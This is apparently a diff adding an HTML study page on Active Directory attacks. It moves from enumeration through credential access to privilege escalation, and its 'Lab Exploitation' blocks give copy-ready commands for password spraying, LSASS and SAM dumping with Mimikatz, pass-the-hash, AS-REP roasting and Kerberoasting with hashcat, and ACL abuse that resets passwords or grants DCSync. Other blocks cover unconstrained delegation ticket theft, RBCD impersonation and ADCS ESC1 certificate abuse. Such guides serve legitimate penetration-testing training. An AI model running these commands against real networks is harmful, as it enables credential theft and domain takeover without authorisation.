+        <li><strong>Group</strong> — collections of users (Domain Admins, Enterprise Admins)</li>
+        <li><strong>Computer</strong> — machine accounts</li>
+        <li><strong>OU</strong> — Organizational Unit — container for objects</li>
+        <li><strong>GPO</strong> — Group Policy Objects — configuration</li>
+        <li><strong>Trust</strong> — relationship between domains/forests</li>
+      </ul>
+
+      <div class="mental-model">
+        <div class="title">🧠 The AD Mental Model</div>
+        <p>Think of AD as a graph:</p>
+        <p style="margin-top:0.5rem; font-weight:600; color: var(--accent);">
+          Nodes = Users, Groups, Computers, GPOs<br>
+          Edges = Permissions (GenericAll, WriteDACL, ForceChangePassword, etc.)
+        </p>
+        <p style="margin-top:0.5rem; color: var(--text-dim); font-size:0.85rem;">
+          BloodHound visualizes this graph — it shows you the shortest path from your user to Domain Admin.
+        </p>
+      </div>
+    </section>
+
+    <!-- ==================== ATTACK CHAIN ==================== -->
+    <section class="section" id="attack-chain">
+      <h2>⛓️ AD Attack Chain</h2>
+      <p>Typical AD attack lifecycle:</p>
+      <div class="code-block">
+        <pre>Initial Foothold (phishing, exploit, credentials)
+    ↓
+Enumerate AD (users, groups, computers, trusts, ACLs)
+    ↓
+Find Attack Path (Kerberoast, ACL abuse, delegation)
+    ↓
+Credential Access (crack hashes, extract secrets)
+    ↓
+Lateral Movement (SMB, WinRM, RDP, PsExec)
+    ↓
+Privilege Escalation (DCSync, Golden Ticket, ADCS)
+    ↓
+Domain Admin / Enterprise Admin
+    ↓
+Persistence (Golden Ticket, Skeleton Key, DSRM)</pre>
+      </div>
+      <p>Every step depends on the previous one. Enumeration is the foundation.</p>
+    </section>
+
+    <!-- ==================== WORKFLOW ==================== -->
+    <section class="section" id="workflow">
+      <h2>🔄 Enumeration → Exploitation Workflow</h2>
+
+      <div class="section-intro">
+        <strong>Every AD attack follows the same workflow.</strong> Standardize your approach and you'll never miss a step.
+      </div>
+
+      <div class="code-block">
+        <pre>ENUMERATE
+    ↓
+IDENTIFY (find interesting permissions / paths)
+    ↓
+HYPOTHESIS (how can this be abused?)
+    ↓
+VALIDATE (test in a lab or with low-impact techniques)
+    ↓
+EXPLOIT
+    ↓
+VERIFY PRIVILEGE
+    ↓
+UNDERSTAND ROOT CAUSE
+    ↓
+REMEDIATE</pre>
+      </div>
+
+      <div class="mental-model">
+        <div class="title">🧠 Never skip enumeration</div>
+        <p>In AD, the enumeration phase determines 90% of your attack success. BloodHound paths, ACLs, and Kerberos tickets are all in the data — you just need to find them.</p>
+      </div>
+    </section>
+
+    <!-- ==================== ENUM OVERVIEW ==================== -->
+    <section class="section" id="enum-overview">
+      <h2>🔍 AD Enumeration Overview</h2>
+
+      <div class="section-intro">
+        <strong>Enumeration is everything in AD.</strong> The attack path is almost always in the data — you just have to find it.
+      </div>
+
+      <div class="why-grid">
+        <div class="why-card">
+          <span class="label">What</span>
+          <p>Discovering users, groups, computers, trusts, ACLs, sessions, shares, and GPOs.</p>
+        </div>
+        <div class="why-card">
+          <span class="label why">Why</span>
+          <p>Every escalation path starts with an enumeration finding. Without it, you're guessing.</p>
+        </div>
+        <div class="why-card">
+          <span class="label how">How</span>
+          <p>Use PowerView, BloodHound, SharpHound, ldapsearch, and native Windows tools.</p>
+        </div>
+        <div class="why-card">
+          <span class="label when">When</span>
+          <p>Immediately after gaining a foothold — even a low-priv domain user account is enough.</p>
+        </div>
+      </div>
+
+      <h3>Key Enumeration Targets</h3>
+      <ul>
+        <li><strong>Users</strong> — who exists, who is admin, who has SPNs, who has "Do not require Kerberos preauth"</li>
+        <li><strong>Groups</strong> — Domain Admins, Enterprise Admins, nested groups</li>
+        <li><strong>Computers</strong> — DCs, servers, workstations, OS versions</li>
+        <li><strong>Trusts</strong> — parent/child, external, forest trusts</li>
+        <li><strong>ACLs</strong> — who has GenericAll, WriteDACL, WriteOwner, ForceChangePassword on what</li>
+        <li><strong>Sessions</strong> — who is logged into which machine (for lateral movement)</li>
+        <li><strong>Shares</strong> — SMB shares, permissions, interesting files</li>
+        <li><strong>GPOs</strong> — who can modify them, what they apply to</li>
+        <li><strong>ADCS</strong> — certificate templates, CAs, ESC1–ESC8</li>
+        <li><strong>Delegation</strong> — unconstrained, constrained, RBCD</li>
+      </ul>
+    </section>
+
+    <!-- ==================== POWERVIEW ==================== -->
+    <section class="section" id="enum-powerview">
+      <h2>⚡ PowerView / SharpHound Enumeration</h2>
+      <span class="reliability rel-green">🟢 Reliable — core AD enumeration</span>
+
+      <div class="why-grid">
+        <div class="why-card">
+          <span class="label">What</span>
+          <p>PowerView is a PowerShell tool for AD enumeration; SharpHound is its C# counterpart used by BloodHound.</p>
+        </div>
+        <div class="why-card">
+          <span class="label why">Why</span>
+          <p>Provides structured access to every AD object and its permissions.</p>
+        </div>
+        <div class="why-card">
+          <span class="label how">How</span>
+          <p>Import the module, then use cmdlets like <code>Get-DomainUser</code>, <code>Get-DomainGroup</code>, <code>Find-InterestingDomainAcl</code>.</p>
+        </div>
+        <div class="why-card">
+          <span class="label when">When</span>
+          <p>As soon as you have any domain credentials.</p>
+        </div>
+      </div>
+
+      <div class="code-block">
+        <div class="code-header"><span>PowerShell</span><button onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="comment"># Import PowerView</span>
+<span class="cmd">. .\PowerView.ps1</span>
+
+<span class="comment"># Enumerate domain users</span>
+<span class="cmd">Get-DomainUser | Select-Object samaccountname,description,memberof</span>
+
+<span class="comment"># Enumerate domain groups</span>
+<span class="cmd">Get-DomainGroup | Select-Object samaccountname,description</span>
+
+<span class="comment"># Enumerate computers</span>
+<span class="cmd">Get-DomainComputer | Select-Object dnshostname,operatingsystem</span>
+
+<span class="comment"># Find users with SPNs (Kerberoastable)</span>
+<span class="cmd">Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname</span>
+
+<span class="comment"># Find users with "Do not require Kerberos preauth" (AS-REP roastable)</span>
+<span class="cmd">Get-DomainUser -PreauthNotRequired</span>
+
+<span class="comment"># Find interesting ACLs</span>
+<span class="cmd">Find-InterestingDomainAcl -ResolveGUIDs | Select-Object ObjectDN,IdentityReferenceName,ActiveDirectoryRights</span>
+
+<span class="comment"># Find domain trusts</span>
+<span class="cmd">Get-DomainTrust</span>
+
+<span class="comment"># Find local admins on a machine</span>
+<span class="cmd">Find-LocalAdminAccess</span></pre>
+      </div>
+
+      <h4>SharpHound (for BloodHound)</h4>
+      <div class="code-block">
+        <div class="code-header"><span>CMD</span><button onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="comment"># Collect all AD data into a zip for BloodHound</span>
+<span class="cmd">SharpHound.exe -c All</span>
+
+<span class="comment"># Or with stealth options</span>
+<span class="cmd">SharpHound.exe -c All --Stealth</span></pre>
+      </div>
+    </section>
+
+    <!-- ==================== BLOODHOUND ==================== -->
+    <section class="section" id="enum-bloodhound">
+      <h2>🩸 BloodHound</h2>
+
+      <div class="section-intro">
+        <strong>BloodHound visualizes AD attack paths.</strong> It shows you exactly how to get from your user to Domain Admin using the data collected by SharpHound.
+      </div>
+
+      <div class="why-grid">
+        <div class="why-card">
+          <span class="label">What</span>
+          <p>A graph-based tool that ingests SharpHound data and shows attack paths.</p>
+        </div>
+        <div class="why-card">
+          <span class="label why">Why</span>
+          <p>Manual enumeration misses paths. BloodHound finds the shortest path from any user to DA.</p>
+        </div>
+        <div class="why-card">
+          <span class="label how">How</span>
+          <p>Collect with SharpHound, import into BloodHound, then run built-in queries.</p>
+        </div>
+        <div class="why-card">
+          <span class="label when">When</span>
+          <p>As soon as you have AD credentials — it's the fastest way to find paths.</p>
+        </div>
+      </div>
+
+      <h4>Key BloodHound Queries</h4>
+      <ul>
+        <li><strong>Shortest Paths to Domain Admins</strong> — from your user</li>
+        <li><strong>Kerberoastable Users</strong> — users with SPNs</li>
+        <li><strong>AS-REP Roastable Users</strong> — users without preauth</li>
+        <li><strong>Users with DCSync Rights</strong> — who can DCSync</li>
+        <li><strong>Unconstrained Delegation</strong> — computers/users with it</li>
+        <li><strong>Computers Where Domain Admins Are Logged In</strong> — for lateral movement</li>
+        <li><strong>Shortest Paths to High Value Targets</strong> — from any owned principal</li>
+      </ul>
+
+      <div class="exploit-block">
+        <h5>🎯 Lab Exploitation — BloodHound Workflow</h5>
+        <div class="code-block">
+          <div class="code-header"><span>CMD</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="comment"># 1. Collect data on target</span>
+<span class="cmd">SharpHound.exe -c All --zipfilename loot.zip</span>
+
+<span class="comment"># 2. Transfer loot.zip to your attack machine</span>
+<span class="comment"># 3. Import into BloodHound GUI</span>
+<span class="comment"># 4. Mark your user as Owned</span>
+<span class="comment"># 5. Run "Shortest Path to Domain Admins" query</span>
+<span class="comment"># 6. Follow the path — BloodHound shows every edge and technique</span></pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- ==================== ENUM USERS ==================== -->
+    <section class="section" id="enum-users">
+      <h2>👤 Users & Groups</h2>
+
+      <div class="why-grid">
+        <div class="why-card">
+          <span class="label">What</span>
+          <p>AD user accounts and group memberships.</p>
+        </div>
+        <div class="why-card">
+          <span class="label why">Why</span>
+          <p>Users with SPNs are Kerberoastable. Users with preauth disabled are AS-REP roastable. Admin groups are the target.</p>
+        </div>
+        <div class="why-card">
+          <span class="label how">How</span>
+          <p><code>Get-DomainUser</code>, <code>net user /domain</code>, <code>Get-ADUser</code>, ldapsearch.</p>
+        </div>
+        <div class="why-card">
+          <span class="label when">When</span>
+          <p>First step of AD enumeration.</p>
+        </div>
+      </div>
+
+      <div class="code-block">
+        <div class="code-header"><span>PowerShell</span><button onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="cmd">net user /domain</span>
+<span class="cmd">net group "Domain Admins" /domain</span>
+<span class="cmd">net group "Enterprise Admins" /domain</span>
+
+<span class="comment"># PowerView</span>
+<span class="cmd">Get-DomainUser</span>
+<span class="cmd">Get-DomainUser -SPN</span>
+<span class="cmd">Get-DomainUser -PreauthNotRequired</span>
+<span class="cmd">Get-DomainGroup -Identity "Domain Admins" | Select-Object -ExpandProperty member</span></pre>
+      </div>
+    </section>
+
+    <!-- ==================== ENUM COMPUTERS ==================== -->
+    <section class="section" id="enum-computers">
+      <h2>💻 Computers & Trusts</h2>
+
+      <div class="code-block">
+        <div class="code-header"><span>PowerShell</span><button onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="comment"># Computers</span>
+<span class="cmd">Get-DomainComputer | Select-Object dnshostname,operatingsystem,lastlogontimestamp</span>
+
+<span class="comment"># Domain Controllers</span>
+<span class="cmd">Get-DomainController</span>
+
+<span class="comment"># Trusts</span>
+<span class="cmd">Get-DomainTrust</span>
+<span class="cmd">Get-ForestTrust</span>
+<span class="cmd">nltest /domain_trusts</span></pre>
+      </div>
+    </section>
+
+    <!-- ==================== ENUM SHARES ==================== -->
+    <section class="section" id="enum-shares">
+      <h2>📁 Shares & Sessions</h2>
+
+      <div class="code-block">
+        <div class="code-header"><span>PowerShell</span><button onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="comment"># Find shares on computers</span>
+<span class="cmd">Find-DomainShare -CheckShareAccess</span>
+
+<span class="comment"># Find interesting files in shares</span>
+<span class="cmd">Find-InterestingDomainShareFile</span>
+
+<span class="comment"># Find where users are logged in</span>
+<span class="cmd">Find-DomainUserLocation</span>
+
+<span class="comment"># Find local admin access</span>
+<span class="cmd">Find-LocalAdminAccess</span></pre>
+      </div>
+
+      <h4>NetExec / CrackMapExec</h4>
+      <div class="code-block">
+        <div class="code-header"><span>Linux</span><button onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="cmd">netexec smb 10.10.10.0/24 -u user -p pass --shares</span>
+<span class="cmd">netexec smb 10.10.10.0/24 -u user -p pass --sessions</span>
+<span class="cmd">netexec smb 10.10.10.0/24 -u user -p pass --loggedon-users</span></pre>
+      </div>
+    </section>
+
+    <!-- ==================== CRED ATTACKS ==================== -->
+    <section class="section" id="cred-attacks">
+      <h2>🔑 Credential Attacks</h2>
+
+      <div class="section-intro">
+        <strong>Credentials are the currency of AD.</strong> Every step forward is unlocked by a new credential — a password, a hash, or a ticket.
+      </div>
+
+      <div class="why-grid">
+        <div class="why-card">
+          <span class="label">What</span>
+          <p>Obtaining credentials: password spraying, brute force, hash extraction, ticket theft.</p>
+        </div>
+        <div class="why-card">
+          <span class="label why">Why</span>
+          <p>A new credential unlocks new permissions, new sessions, and new attack paths.</p>
+        </div>
+        <div class="why-card">
+          <span class="label how">How</span>
+          <p>CrackMapExec, NetExec, Kerbrute, Mimikatz, secretsdump, Responder, Impacket.</p>
+        </div>
+        <div class="why-card">
+          <span class="label limit">Caution</span>
+          <p>Password spraying can lock accounts. Always check the lockout policy first.</p>
+        </div>
+      </div>
+
+      <h4>Password Spraying</h4>
+      <div class="code-block">
+        <div class="code-header"><span>Linux</span><button onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="comment"># Check lockout policy first!</span>
+<span class="cmd">netexec smb DC01 -u user -p pass --pass-pol</span>
+
+<span class="comment"># Spray with a single password against many users</span>
+<span class="cmd">netexec smb DC01 -u users.txt -p 'Summer2024!' --continue-on-success</span>
+
+<span class="comment"># Kerbrute for user enumeration and spraying</span>
+<span class="cmd">kerbrute userenum --dc DC01 -d domain.local users.txt</span>
+<span class="cmd">kerbrute passwordspray --dc DC01 -d domain.local users.txt 'Password123!'</span></pre>
+      </div>
+
+      <h4>Hash Extraction (from a compromised host)</h4>
+      <div class="code-block">
+        <div class="code-header"><span>Windows</span><button onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="comment"># Dump SAM and LSA (local hashes)</span>
+<span class="cmd">mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "lsadump::sam" exit</span>
+
+<span class="comment"># Dump LSASS to a file for offline analysis</span>
+<span class="cmd">procdump.exe -accepteula -ma lsass.exe lsass.dmp</span>
+
+<span class="comment"># On Linux, extract from dumps</span>
+<span class="cmd">pypykatz lsa minidump lsass.dmp</span></pre>
+      </div>
+
+      <div class="exploit-block">
+        <h5>🎯 Lab Exploitation — Pass-the-Hash</h5>
+        <p>If you have an NTLM hash, you can authenticate without cracking it:</p>
+        <div class="code-block">
+          <div class="code-header"><span>Linux</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="cmd">netexec smb DC01 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 --shares</span>
+<span class="cmd">psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 Administrator@DC01</span></pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- ==================== KERBEROS ==================== -->
+    <section class="section" id="kerberos">
+      <h2>🎟️ Kerberos Attacks</h2>
+
+      <div class="section-intro">
+        <strong>Kerberos is the default AD authentication protocol.</strong> Many AD attacks abuse specific Kerberos behaviors — pre-auth, SPNs, delegation, and ticket lifetimes.
+      </div>
+
+      <div class="why-grid">
+        <div class="why-card">
+          <span class="label">What</span>
+          <p>Attacks on Kerberos: AS-REP Roasting, Kerberoasting, Golden/Silver Tickets, delegation abuse.</p>
+        </div>
+        <div class="why-card">
+          <span class="label why">Why</span>
+          <p>Kerberos tickets contain credential material. If you can request them, you can crack them.</p>
+        </div>
+        <div class="why-card">
+          <span class="label how">How</span>
+          <p>Impacket (GetUserSPNs, GetNPUsers), Rubeus, Mimikatz.</p>
+        </div>
+        <div class="why-card">
+          <span class="label when">When</span>
+          <p>After enumeration finds SPNs or preauth-disabled accounts.</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- ==================== ASREP ==================== -->
+    <section class="section" id="asrep">
+      <h2>🔓 AS-REP Roasting</h2>
+      <span class="reliability rel-green">🟢 Reliable — if users have preauth disabled</span>
+
+      <div class="why-grid">
+        <div class="why-card">
+          <span class="label">What</span>
+          <p>Users with "Do not require Kerberos preauthentication" can have their AS-REP response requested without credentials.</p>
+        </div>
+        <div class="why-card">
+          <span class="label why">Why</span>
+          <p>The AS-REP contains a hash encrypted with the user's password. You can crack it offline.</p>
+        </div>
+        <div class="why-card">
+          <span class="label how">How</span>
+          <p><code>GetNPUsers.py</code> (Impacket) or <code>Rubeus asreproast</code>.</p>
+        </div>
+        <div class="why-card">
+          <span class="label when">When</span>
+          <p>After <code>Get-DomainUser -PreauthNotRequired</code> returns accounts.</p>
+        </div>
+      </div>
+
+      <div class="code-block">
+        <div class="code-header"><span>Linux</span><button onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="comment"># Without any credentials</span>
+<span class="cmd">GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt</span>
+
+<span class="comment"># With a valid user</span>
+<span class="cmd">GetNPUsers.py domain.local/user:password -request -format hashcat -outputfile asrep.txt</span></pre>
+      </div>
+
+      <h4>Exploitability Checklist</h4>
+      <div class="exploit-check">
+        <span class="title">✓ Verify before exploiting</span>
+        <span class="ok">[✓]</span> One or more users have "Do not require Kerberos preauth"<br>
+        <span class="ok">[✓]</span> You can request AS-REP without credentials (or with a valid user)<br>
+        <span class="ok">[✓]</span> You can crack the hash offline (hashcat mode 18200)<br>
+        <span class="ok">[✓]</span> The user has meaningful privileges
+      </div>
+
+      <div class="exploit-block">
+        <h5>🎯 Lab Exploitation — Crack and Use</h5>
+        <div class="code-block">
+          <div class="code-header"><span>Linux</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="cmd">hashcat -m 18200 asrep.txt rockyou.txt</span>
+<span class="comment"># Once cracked, use the password to authenticate</span>
+<span class="cmd">netexec smb DC01 -u asrepuser -p cracked_password</span></pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- ==================== KERBEROAST ==================== -->
+    <section class="section" id="kerberoast">
+      <h2>🔥 Kerberoasting</h2>
+      <span class="reliability rel-green">🟢 Reliable — if SPN accounts exist</span>
+
+      <div class="why-grid">
+        <div class="why-card">
+          <span class="label">What</span>
+          <p>Request a service ticket (TGS) for any account with an SPN. The ticket is encrypted with the account's NTLM hash.</p>
+        </div>
+        <div class="why-card">
+          <span class="label why">Why</span>
+          <p>You can crack the TGS offline. Service accounts often have weak passwords and high privileges.</p>
+        </div>
+        <div class="why-card">
+          <span class="label how">How</span>
+          <p><code>GetUserSPNs.py</code> (Impacket) or <code>Rubeus kerberoast</code>.</p>
+        </div>
+        <div class="why-card">
+          <span class="label when">When</span>
+          <p>After enumeration shows users with SPNs.</p>
+        </div>
+      </div>
+
+      <div class="code-block">
+        <div class="code-header"><span>Linux</span><button onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="cmd">GetUserSPNs.py domain.local/user:password -request -outputfile kerberoast.txt</span></pre>
+      </div>
+
+      <h4>Exploitability Checklist</h4>
+      <div class="exploit-check">
+        <span class="title">✓ Verify before exploiting</span>
+        <span class="ok">[✓]</span> One or more users have SPNs set<br>
+        <span class="ok">[✓]</span> You have any valid domain user credentials<br>
+        <span class="ok">[✓]</span> The SPN account password is crackable<br>
+        <span class="ok">[✓]</span> The SPN account has meaningful privileges
+      </div>
+
+      <div class="exploit-block">
+        <h5>🎯 Lab Exploitation — Kerberoast and Crack</h5>
+        <div class="code-block">
+          <div class="code-header"><span>Linux</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="cmd">GetUserSPNs.py domain.local/user:password -request -outputfile kerberoast.txt</span>
+<span class="cmd">hashcat -m 13100 kerberoast.txt rockyou.txt</span>
+<span class="comment"># Once cracked:</span>
+<span class="cmd">netexec smb DC01 -u svc_account -p cracked_password</span></pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- ==================== ACL ABUSE ==================== -->
+    <section class="section" id="acl-abuse">
+      <h2>📋 ACL Abuse</h2>
+      <span class="reliability rel-green">🟢 Reliable — if ACL grants meaningful rights</span>
+
+      <div class="section-intro">
+        <strong>ACLs are the edges of the AD graph.</strong> Almost every privilege escalation path in AD goes through an ACL.
+      </div>
+
+      <div class="why-grid">
+        <div class="why-card">
+          <span class="label">What</span>
+          <p>Permissions on AD objects that, when misconfigured, allow a low-priv user to control a higher-priv object.</p>
+        </div>
+        <div class="why-card">
+          <span class="label why">Why dangerous</span>
+          <p>Example: if you have <code>GenericAll</code> over a Domain Admin user, you can reset their password.</p>
+        </div>
+        <div class="why-card">
+          <span class="label how">How</span>
+          <p>BloodHound finds them; <code>Find-InterestingDomainAcl</code> enumerates them.</p>
+        </div>
+        <div class="why-card">
+          <span class="label when">When</span>
+          <p>After BloodHound or PowerView enumeration.</p>
+        </div>
+      </div>
+
+      <h4>Dangerous ACLs</h4>
+      <table>
+        <tr><th>ACL</th><th>What it allows</th></tr>
+        <tr><td><code>GenericAll</code></td><td>Full control — reset password, add to group, modify</td></tr>
+        <tr><td><code>GenericWrite</code></td><td>Modify attributes — set SPN, logon script</td></tr>
+        <tr><td><code>WriteDACL</code></td><td>Grant yourself any permission</td></tr>
+        <tr><td><code>WriteOwner</code></td><td>Take ownership, then modify</td></tr>
+        <tr><td><code>ForceChangePassword</code></td><td>Reset another user's password</td></tr>
+        <tr><td><code>AddMember</code></td><td>Add yourself to a group</td></tr>
+        <tr><td><code>AllExtendedRights</code></td><td>Includes ForceChangePassword, DCSync</td></tr>
+        <tr><td><code>DCSync</code></td><td>Replicate AD data — extract any user's hash</td></tr>
+      </table>
+
+      <h4>Exploitability Checklist</h4>
+      <div class="exploit-check">
+        <span class="title">✓ Verify before exploiting</span>
+        <span class="ok">[✓]</span> You have a dangerous ACL over a higher-priv object<br>
+        <span class="ok">[✓]</span> The ACL is effective (not blocked by inheritance or deny)<br>
+        <span class="ok">[✓]</span> The target object has meaningful privilege<br>
+        <span class="ok">[✓]</span> You can reach the object (network, LDAP access)
+      </div>
+
+      <div class="exploit-block">
+        <h5>🎯 Lab Exploitation — GenericAll over a user</h5>
+        <div class="code-block">
+          <div class="code-header"><span>Linux</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="comment"># Reset the target's password via PowerView</span>
+<span class="cmd">Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'NewP@ssw0rd!' -AsPlainText -Force)</span>
+
+<span class="comment"># Or via bloodyAD (Linux)</span>
+<span class="cmd">bloodyAD -u user -p pass -d domain.local --host DC01 set password targetuser 'NewP@ssw0rd!'</span></pre>
+        </div>
+
+        <h5>Lab Exploitation — GenericAll over a group</h5>
+        <div class="code-block">
+          <div class="code-header"><span>PowerShell</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="cmd">Add-DomainGroupMember -Identity "Domain Admins" -Members youruser</span></pre>
+        </div>
+
+        <h5>Lab Exploitation — WriteDACL over a group</h5>
+        <div class="code-block">
+          <div class="code-header"><span>PowerShell</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="comment"># Grant yourself DCSync rights on the domain</span>
+<span class="cmd">Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity youruser -Rights DCSync</span>
+
+<span class="comment"># Then DCSync</span>
+<span class="cmd">mimikatz.exe "lsadump::dcsync /domain:domain.local /user:Administrator" exit</span></pre>
+        </div>
+
+        <h5>Lab Exploitation — ForceChangePassword</h5>
+        <div class="code-block">
+          <div class="code-header"><span>Linux</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="cmd">net rpc password targetuser 'NewP@ssw0rd!' -U domain.local/user%password -S DC01</span></pre>
+        </div>
+
+        <h5>Lab Exploitation — WriteOwner</h5>
+        <div class="code-block">
+          <div class="code-header"><span>PowerShell</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="cmd">Set-DomainObjectOwner -Identity targetuser -OwnerIdentity youruser</span>
+<span class="comment"># Now you own the object and can modify its ACL</span>
+<span class="cmd">Add-DomainObjectAcl -TargetIdentity targetuser -PrincipalIdentity youruser -Rights All</span></pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- ==================== DELEGATION ==================== -->
+    <section class="section" id="delegation">
+      <h2>🎫 Delegation</h2>
+
+      <div class="section-intro">
+        <strong>Delegation lets a service act on behalf of a user.</strong> Misconfigured delegation allows you to impersonate users — including Domain Admins.
+      </div>
+
+      <div class="why-grid">
+        <div class="why-card">
+          <span class="label">What</span>
+          <p>Three types: Unconstrained, Constrained, Resource-Based Constrained Delegation (RBCD).</p>
+        </div>
+        <div class="why-card">
+          <span class="label why">Why dangerous</span>
+          <p>Unconstrained delegation caches TGTs of users who connect. RBCD lets you impersonate any user to a target service.</p>
+        </div>
+        <div class="why-card">
+          <span class="label how">How</span>
+          <p><code>Get-DomainComputer -Unconstrained</code>, BloodHound "Unconstrained Delegation" query.</p>
+        </div>
+        <div class="why-card">
+          <span class="label when">When</span>
+          <p>After enumeration reveals delegation configuration.</p>
+        </div>
+      </div>
+
+      <h4>Exploitability Checklist</h4>
+      <div class="exploit-check">
+        <span class="title">✓ Verify before exploiting</span>
+        <span class="ok">[✓]</span> A computer or user has delegation configured<br>
+        <span class="ok">[✓]</span> You can coerce a privileged user to authenticate<br>
+        <span class="ok">[✓]</span> OR you can modify the target's msDS-AllowedToActOnBehalfOfOtherIdentity (RBCD)<br>
+        <span class="ok">[✓]</span> You have a machine account (or can create one)
+      </div>
+
+      <div class="exploit-block">
+        <h5>🎯 Lab Exploitation — Unconstrained Delegation</h5>
+        <div class="code-block">
+          <div class="code-header"><span>PowerShell</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="comment"># Find computers with unconstrained delegation</span>
+<span class="cmd">Get-DomainComputer -Unconstrained | Select-Object dnshostname</span>
+
+<span class="comment"># If you compromise such a machine and a DA connects, extract the TGT</span>
+<span class="cmd">Rubeus.exe monitor /interval:5 /nowrap</span>
+<span class="comment"># Or dump cached tickets:</span>
+<span class="cmd">mimikatz.exe "sekurlsa::tickets /export" exit</span>
+
+<span class="comment"># Inject the extracted TGT</span>
+<span class="cmd">Rubeus.exe ptt /ticket:base64ticket</span></pre>
+        </div>
+
+        <h5>Lab Exploitation — RBCD</h5>
+        <div class="code-block">
+          <div class="code-header"><span>Linux</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="comment"># 1. Create a machine account (if MachineAccountQuota > 0)</span>
+<span class="cmd">addcomputer.py -computer-name EVIL$ -computer-pass Password123 domain.local/user:pass -dc-ip DC01</span>
+
+<span class="comment"># 2. Set RBCD on target computer</span>
+<span class="cmd">rbcd.py -delegate-from 'EVIL$' -delegate-to 'TARGET$' -action write domain.local/user:pass -dc-ip DC01</span>
+
+<span class="comment"># 3. Get a service ticket impersonating Administrator</span>
+<span class="cmd">getST.py -spn cifs/TARGET.domain.local -impersonate Administrator domain.local/'EVIL$':Password123</span>
+
+<span class="comment"># 4. Use the ticket</span>
+<span class="cmd">export KRB5CCNAME=Administrator.ccache</span>
+<span class="cmd">psexec.py -k -no-pass TARGET.domain.local</span></pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- ==================== ADCS ==================== -->
+    <section class="section" id="adcs">
+      <h2>📜 ADCS Abuse</h2>
+      <span class="reliability rel-green">🟢 Reliable — if vulnerable templates exist</span>
+
+      <div class="section-intro">
+        <strong>ADCS is the second-most common AD escalation path after ACLs.</strong> Misconfigured certificate templates can grant Domain Admin.
+      </div>
+
+      <div class="why-grid">
+        <div class="why-card">
+          <span class="label">What</span>
+          <p>Active Directory Certificate Services issues certificates for authentication. Misconfigured templates allow impersonation.</p>
+        </div>
+        <div class="why-card">
+          <span class="label why">Why dangerous</span>
+          <p>ESC1–ESC8 vulnerabilities can grant Domain Admin, or allow certificate theft leading to persistent access.</p>
+        </div>
+        <div class="why-card">
+          <span class="label how">How</span>
+          <p>Certipy, Certify, BloodHound (with ADCS integration).</p>
+        </div>
+        <div class="why-card">
+          <span class="label when">When</span>
+          <p>After enumeration shows a CA and templates.</p>
+        </div>
+      </div>
+
+      <h4>Common ADCS Attack Types</h4>
+      <table>
+        <tr><th>Type</th><th>Description</th></tr>
+        <tr><td><strong>ESC1</strong></td><td>Template allows requester to specify SAN (enroll as any user)</td></tr>
+        <tr><td><strong>ESC2</strong></td><td>Template allows any purpose (including client auth)</td></tr>
+        <tr><td><strong>ESC3</strong></td><td>Enrollment agent template abuse</td></tr>
+        <tr><td><strong>ESC4</strong></td><td>Writable template — modify to enable ESC1</td></tr>
+        <tr><td><strong>ESC5</strong></td><td>Writable PKI objects (CA, templates, etc.)</td></tr>
+        <tr><td><strong>ESC6</strong></td><td>CA has EDITF_ATTRIBUTESUBJECTALTNAME2 flag</td></tr>
+        <tr><td><strong>ESC7</strong></td><td>CA officer rights (ManageCA, ManageCertificates)</td></tr>
+        <tr><td><strong>ESC8</strong></td><td>NTLM relay to HTTP enrollment endpoint</td></tr>
+      </table>
+
+      <h4>Exploitability Checklist</h4>
+      <div class="exploit-check">
+        <span class="title">✓ Verify before exploiting</span>
+        <span class="ok">[✓]</span> A CA is present and reachable<br>
+        <span class="ok">[✓]</span> A vulnerable template exists (ESC1–ESC8)<br>
+        <span class="ok">[✓]</span> You can enroll for that template (with your user or a compromised account)<br>
+        <span class="ok">[✓]</span> The template allows client authentication
+      </div>
+
+      <div class="exploit-block">
+        <h5>🎯 Lab Exploitation — ESC1</h5>
+        <div class="code-block">
+          <div class="code-header"><span>Linux</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="comment"># 1. Find vulnerable templates</span>
+<span class="cmd">certipy find -u user@domain.local -p password -dc-ip DC01 -vulnerable</span>
+
+<span class="comment"># 2. Request certificate with Administrator SAN</span>
+<span class="cmd">certipy req -u user@domain.local -p password -ca 'CA-NAME' -template 'VulnTemplate' -upn administrator@domain.local</span>
+
+<span class="comment"># 3. Authenticate using the certificate</span>
+<span class="cmd">certipy auth -pfx administrator.pfx -dc-ip DC01</span>
+<span class="comment"># You'll get Administrator's NTLM hash</span></pre>
